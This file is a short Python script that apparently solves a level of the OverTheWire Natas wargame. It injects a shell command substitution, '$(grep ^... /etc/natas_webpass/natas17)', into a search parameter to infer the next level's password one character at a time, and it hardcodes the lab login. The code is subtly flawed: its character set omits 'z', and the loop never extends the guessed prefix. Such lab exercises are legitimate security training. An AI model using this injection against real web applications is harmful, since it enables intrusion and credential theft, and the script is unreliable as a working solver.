import requests

url = "http://natas16.natas.labs.overthewire.org/"
username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
all_possible_chars = '0123456789abcdefghijklmnopqrstuvwxysABCDEFGHIJKLMNOPQRSTUVWXYZ'
lis = []
count = 0
for i in all_possible_chars:
	params = {'needle': "$(grep ^" + i + " /etc/natas_webpass/natas17)elephant"}
	r = requests.get(url, params=params, auth = (username, password))
	print(count)
	print(r.url)
	count += 1
	if 'elephant' not in r.text:
		lis.append(i)
		print("".join(lis))
	